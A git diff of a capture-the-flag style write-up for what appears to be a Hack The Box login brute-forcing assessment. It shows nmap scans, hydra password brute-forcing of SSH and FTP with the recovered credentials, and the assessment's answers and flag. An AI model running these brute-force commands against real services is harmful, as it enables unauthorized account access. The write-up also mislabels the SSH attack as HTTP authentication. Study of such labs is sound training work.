@@ -4,7 +4,7 @@ Use the username you were given when you completed part 1 of the skills assessme
 ## Questions
 1. What is the username of the ftp user you find via brute-forcing? **Answer: thomas**
    - Identify that ssh is running on port 32250:
-        ```sh
+        ```shellsession
         $ nmap -Pn -sV -p 32250 154.57.164.67
         Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-14 04:46 CDT
         Nmap scan report for 154-57-164-67.static.isp.htb.systems (154.57.164.67)
@@ -15,7 +15,7 @@ Use the username you were given when you completed part 1 of the skills assessme
         Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
         ```
    - Run hydra with the basic HTTP authentication module → found `satwossh`:`password1`
-        ```sh
+        ```shellsession
         $ hydra -l satwossh -P 2023-200_most_used_passwords.txt -s 32250 ssh://154.57.164.67
         Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -27,7 +27,7 @@ Use the username you were given when you completed part 1 of the skills assessme
         [32250][ssh] host: 154.57.164.67   login: satwossh   password: password1
         ```
    - SSH to the target with found credentials and identify that FTP is opening:
-     ```sh
+     ```shellsession
      $ ssh -p 32250 satwossh@154.57.164.67
      satwossh@ng-1863259-loginbfsatwo-9vaiy-54d95956d-nl8h4:~$ nmap localhost
      Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-14 09:56 UTC
@@ -42,7 +42,7 @@ Use the username you were given when you completed part 1 of the skills assessme
      Nmap done: 1 IP address (1 host up) scanned in 0.07 seconds
      ```
    - Read the `IncidentReport.txt` → found clue for a username `Thomas Smith`:
-     ```sh
+     ```shellsession
      satwossh@ng-1863259-loginbfsatwo-9vaiy-54d95956d-nl8h4:~$ cat IncidentReport.txt 
      System Logs - Security Report
 
@@ -53,12 +53,12 @@ Use the username you were given when you completed part 1 of the skills assessme
      All logs point towards Thomas Smith being the FTP user responsible for recent questionable transfers. We advise closely monitoring this user’s actions and reviewing any files uploaded to the FTP server.
      ```
    - Use `username-anarchy` to create a list of usernames associated with this name:
-     ```sh
+     ```shellsession
      $ cd username-anarchy
      $ ./username-anarchy Thomas Smith > ../thomas_smith_usernames.txt
      ```
    - Run hydra with the create username list and the password list already stored on the machine:
-     ```sh
+     ```shellsession
      $ hydra -L thomas_smith_usernames.txt -P passwords.txt ftp://localhost
      Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -69,7 +69,7 @@ Use the username you were given when you completed part 1 of the skills assessme
      ```
 2. What is the flag contained within flag.txt **Answer: HTB{brut3f0rc1ng_succ3ssful}**
    - Use the found credentials, login to FTP and read the flag:
-     ```sh
+     ```shellsession
      $ ftp ftp://thomas:'chocolate!'@localhost
      Trying [::1]:21 ...
      Connected to localhost.
